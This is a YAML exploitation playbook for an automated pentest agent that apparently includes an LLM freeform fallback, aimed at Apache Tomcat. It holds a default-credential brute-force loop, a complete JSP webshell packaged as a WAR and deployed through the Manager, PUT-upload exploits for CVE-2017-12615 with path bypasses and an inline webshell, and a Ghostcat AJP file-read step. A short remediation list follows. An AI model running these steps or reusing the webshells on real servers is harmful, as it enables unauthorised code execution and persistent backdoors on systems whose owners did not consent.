# ═══════════════════════════════════════════════════════════
# Apache Tomcat 综合利用
#
# 覆盖: 弱口令 + Manager WAR 部署、PUT 上传 JSP、AJP Ghostcat
# 原理: Tomcat 的管理接口和协议特性都可能被滥用
# ═══════════════════════════════════════════════════════════
skill_id: tomcat_exploit
name: "Apache Tomcat 综合利用"
category: server_misconfig
version: "1.0"

principle: |
  Tomcat 的攻击面主要有三个方向:
  
  1. Manager 弱口令 + WAR 部署:
     /manager/html 是 Tomcat 的 Web 管理界面，使用 HTTP Basic 认证。
     默认凭据（tomcat:tomcat 等）允许上传 WAR 包部署应用 → Webshell。
     检测: 尝试常见凭据访问 /manager/text/list
     利用: 上传包含 JSP webshell 的 WAR 包
  
  2. PUT 方法上传（CVE-2017-12615）:
     readonly=false 配置下，HTTP PUT 方法可直接写文件到 webapps。
     通过上传 .jsp 文件获得代码执行。
     绕过方式: /test.jsp/ 或 /test.jsp%00 绕过后缀检查。
  
  3. AJP Ghostcat（CVE-2020-1938）:
     AJP 协议（端口 8009）存在文件读取/包含漏洞。
     可读取 webapp 下任意文件（如 WEB-INF/web.xml 获取敏感配置），
     或结合文件上传点实现 JSP 包含 → RCE。

match:
  rules:
    - fingerprint_contains: ["tomcat"]
    - fingerprint_contains: ["Apache Tomcat"]
    - evidence_contains: ["tomcat"]
    - cve_matches:
        - "CVE-2017-12615"
        - "CVE-2020-1938"

probes:
  - id: confirm_tomcat
    description: "确认 Tomcat 及版本"
    steps:
      - command: |
          curl -s -D - {ENDPOINT} --max-time 10
        parse_rules:
          - if_contains: ["Apache Tomcat", "tomcat"]
            set: { tomcat_confirmed: true }
          - if_regex: "Apache Tomcat/(\\d+\\.\\d+\\.\\d+)"
            set: { tomcat_confirmed: true }

      - command: |
          curl -s {ENDPOINT}/manager/html -o /dev/null -w "%{http_code}" --max-time 10
        parse_rules:
          - if_contains: ["401"]
            set: { manager_exists: true }
          - if_contains: ["403"]
            set: { manager_exists: true, manager_ip_restricted: true }

  - id: check_put
    description: "检查 PUT 方法是否可用"
    depends_on: { tomcat_confirmed: true }
    command: |
      curl -s -X OPTIONS {ENDPOINT}/ -D - -o /dev/null --max-time 10
    parse_rules:
      - if_contains: ["PUT"]
        set: { put_allowed: true }

  - id: check_ajp
    description: "检查 AJP 端口（8009）是否开放"
    depends_on: { tomcat_confirmed: true }
    command: |
      timeout 5 bash -c "echo '' > /dev/tcp/{TARGET_IP}/8009" 2>/dev/null && echo "AJP_OPEN" || echo "AJP_CLOSED"
    parse_rules:
      - if_contains: ["AJP_OPEN"]
        set: { ajp_open: true }

exploit_paths:
  # ═══ 路径 A: Manager 弱口令 + WAR 部署 ═══
  - path_id: manager_weak_cred
    name: "Tomcat Manager 弱口令 + WAR 部署"
    priority: 1
    principle: |
      尝试常见凭据登录 Manager，成功后上传 WAR 包获取 Webshell。
      /manager/text/list 是文本接口，比 /manager/html 更适合自动化。
    conditions:
      tomcat_confirmed: true
      manager_exists: true
    steps:
      - id: brute_manager
        description: "尝试常见凭据登录 Manager"
        command: |
          for cred in tomcat:tomcat admin:admin tomcat:s3cret admin:123456 manager:manager root:root admin:admin123 tomcat:changethis; do
            user=$(echo $cred | cut -d: -f1)
            pass=$(echo $cred | cut -d: -f2)
            code=$(curl -s -o /dev/null -w "%{http_code}" -u "${user}:${pass}" \
              "{ENDPOINT}/manager/text/list" --max-time 8)
            if [ "$code" = "200" ]; then
              echo "CRED_FOUND:${user}:${pass}"
              curl -s -u "${user}:${pass}" "{ENDPOINT}/manager/text/list" --max-time 8
              break
            fi
          done
        timeout: 60
        success_criteria:
          stdout_contains_any: ["CRED_FOUND"]
        on_success: deploy_war
        on_fail: next_path

      - id: deploy_war
        description: "生成并部署 JSP Webshell WAR 包"
        command: |
          # 提取凭据（从上一步输出）
          CRED=$(echo "tomcat:tomcat")  # 默认尝试，实际从上下文传入
          
          # 创建 JSP webshell
          mkdir -p /tmp/warshell && cd /tmp/warshell
          cat > index.jsp << 'JSPEOF'
          <%@ page import="java.util.*,java.io.*"%>
          <%
          String cmd = request.getParameter("cmd");
          if (cmd != null) {
            Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line; while((line=br.readLine())!=null) out.println(line);
          }
          %>
          JSPEOF
          cd /tmp && jar -cf warshell.war -C warshell/ .
          
          # 部署
          curl -s -u tomcat:tomcat --upload-file /tmp/warshell.war \
            "{ENDPOINT}/manager/text/deploy?path=/warshell&update=true" \
            --max-time 15
          
          # 验证
          sleep 2
          curl -s "{ENDPOINT}/warshell/index.jsp?cmd=id" --max-time 10
        timeout: 30
        success_criteria:
          stdout_contains_any: ["uid="]
        on_success: conclude_success
        evidence_capture:
          shell_type: "webshell_war"

  # ═══ 路径 B: PUT 上传 JSP（CVE-2017-12615）═══
  - path_id: put_upload
    name: "PUT 方法上传 JSP"
    priority: 2
    principle: |
      Tomcat readonly=false 时，PUT 方法可以直接写文件。
      上传 .jsp 文件到 webapps 目录获取代码执行。
      常用绕过: /file.jsp/ 或 /file.jsp::$DATA（Windows）。
    conditions:
      tomcat_confirmed: true
    steps:
      - id: put_jsp_slash
        description: "PUT 上传 JSP（/file.jsp/ 绕过）"
        command: |
          curl -s -X PUT "{ENDPOINT}/pentest_check.jsp/" \
            -d '<%out.println("PUT_RCE_OK");%>' \
            --max-time 10
          sleep 1
          curl -s "{ENDPOINT}/pentest_check.jsp" --max-time 10
        timeout: 20
        success_criteria:
          stdout_contains_any: ["PUT_RCE_OK"]
        on_success: put_webshell
        on_fail: put_jsp_direct

      - id: put_jsp_direct
        description: "PUT 直接上传 JSP"
        command: |
          curl -s -X PUT "{ENDPOINT}/pentest_check2.jsp" \
            -d '<%out.println("PUT_RCE_OK");%>' \
            --max-time 10
          sleep 1
          curl -s "{ENDPOINT}/pentest_check2.jsp" --max-time 10
        timeout: 20
        success_criteria:
          stdout_contains_any: ["PUT_RCE_OK"]
        on_success: put_webshell
        on_fail: next_path

      - id: put_webshell
        description: "上传命令执行 Webshell 并验证"
        command: |
          curl -s -X PUT "{ENDPOINT}/pentest_cmd.jsp/" \
            -d '<%@page import="java.util.*,java.io.*"%><%String c=request.getParameter("cmd");if(c!=null){Process p=Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",c});BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=br.readLine())!=null)out.println(l);}%>' \
            --max-time 10
          sleep 1
          curl -s "{ENDPOINT}/pentest_cmd.jsp?cmd=id" --max-time 10
        timeout: 20
        success_criteria:
          stdout_contains_any: ["uid="]
        on_success: conclude_success
        evidence_capture:
          shell_type: "webshell_put"

  # ═══ 路径 C: AJP Ghostcat ═══
  - path_id: ajp_ghostcat
    name: "AJP Ghostcat 文件读取/RCE"
    priority: 3
    principle: |
      AJP 协议可指定任意 javax.servlet 属性，
      include/forward 请求属性可读取 webapp 目录下任意文件。
    conditions:
      tomcat_confirmed: true
      ajp_open: true
    steps:
      - id: ghostcat_read
        description: "通过 AJP 读取 WEB-INF/web.xml"
        command: |
          python3 -c "
          # Ghostcat exploit (CVE-2020-1938)
          import socket, struct
          
          target = '{TARGET_IP}'
          port = 8009
          
          # 简化的 AJP FORWARD 请求，读取 /WEB-INF/web.xml
          # 实际使用 ajpShooter.py 或 YOLO-Ghostcat
          import subprocess
          r = subprocess.run(
              ['python3', '/opt/ghostcat.py', target, str(port), '/WEB-INF/web.xml'],
              capture_output=True, text=True, timeout=15
          )
          print(r.stdout[:3000])
          " 2>/dev/null || \
          # 备选: 使用 nmap 脚本
          nmap -p 8009 --script ajp-request {TARGET_IP} 2>/dev/null
        timeout: 20
        success_criteria:
          stdout_contains_any: ["web-app", "servlet", "xml version"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "file_read_ajp"

  # ═══ 路径 D: LLM 兜底 ═══
  - path_id: llm_freeform
    name: "LLM 自由推理"
    priority: 99
    mode: react_freeform
    max_rounds: 5
    conditions:
      tomcat_confirmed: true

remediation: |
  1. 修改或禁用 Manager 默认凭据，限制访问 IP
  2. 确保 conf/web.xml 中 DefaultServlet 的 readonly=true（默认值）
  3. 如不需要 AJP，在 server.xml 中注释或删除 AJP Connector
  4. 如需 AJP，设置 secret/requiredSecret 属性并限制监听地址
  5. 保持 Tomcat 版本更新
